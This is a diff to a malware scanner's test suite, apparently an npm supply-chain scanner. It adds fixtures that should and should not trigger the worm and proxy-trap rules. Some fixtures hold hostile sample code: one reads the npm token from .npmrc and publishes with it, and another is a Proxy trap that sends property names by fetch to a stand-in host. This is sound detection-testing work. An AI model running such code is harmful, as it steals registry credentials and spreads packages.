@@ -86,13 +86,29 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
       expect(report.findings.find((f) => f.rule === "SHAI_HULUD_CRED_STEAL")).toBeUndefined();
     });
 
-    it("should FIRE SHAI_HULUD_WORM on .js file running npm publish via execSync", async () => {
+    it("should FIRE SHAI_HULUD_WORM when npm publish follows a credential read", async () => {
+      // The worm signature is publishing with credentials it just harvested.
       fs.writeFileSync(
         path.join(tempDir, "infect.js"),
-        `const { execSync } = require("child_process");\nexecSync("npm publish --access public");`,
+        `const { execSync } = require("child_process");\n` +
+          `const fs = require("fs");\n` +
+          `const token = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");\n` +
+          `execSync("npm publish --//registry.npmjs.org/:_authToken=" + token);`,
       );
       const report = await scan({ target: tempDir, format: "text" });
       expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeDefined();
+    });
+
+    it("should NOT fire SHAI_HULUD_WORM on an ordinary release script", async () => {
+      // `execSync("npm publish")` with no credential handling is what every
+      // library's release script does. This used to be a CRITICAL verdict, which
+      // made every repo with a release script critical on sight.
+      fs.writeFileSync(
+        path.join(tempDir, "release.js"),
+        `const { execSync } = require("child_process");\nexecSync("npm publish --access public");`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeUndefined();
     });
 
     it("should FIRE SHAI_HULUD_CRED_STEAL on .js reading NPM_TOKEN", async () => {
@@ -117,13 +133,25 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
       expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
     });
 
-    it("should FIRE PROXY_HANDLER_TRAP in non-minified .js files", async () => {
+    it("should FIRE PROXY_HANDLER_TRAP when the trap body exfiltrates", async () => {
       fs.writeFileSync(
         path.join(tempDir, "intercept.js"),
-        `const handler = new Proxy(target, { get: function(obj, prop) { steal(prop); return obj[prop]; } });`,
+        `const handler = new Proxy(target, { get: function(obj, prop) { fetch("https://x.invalid/?k=" + prop); return obj[prop]; } });`,
       );
       const report = await scan({ target: tempDir, format: "text" });
       expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeDefined();
+    });
+
+    it("should NOT fire PROXY_HANDLER_TRAP on a plain ES6 Proxy", async () => {
+      // `new Proxy(obj, { get, set })` is a language feature, used by prisma,
+      // vitest, jiti and playwright-core. Matching its definition made all of
+      // them a high-severity finding.
+      fs.writeFileSync(
+        path.join(tempDir, "store.js"),
+        `const store = {};\nconst p = new Proxy(store, { get: (t, k) => t[k], set: (t, k, v) => { t[k] = v; return true; } });\nmodule.exports = p;`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
     });
 
     it("should NOT fire BEACON_INTERVAL_FETCH on .min.js files", async () => {
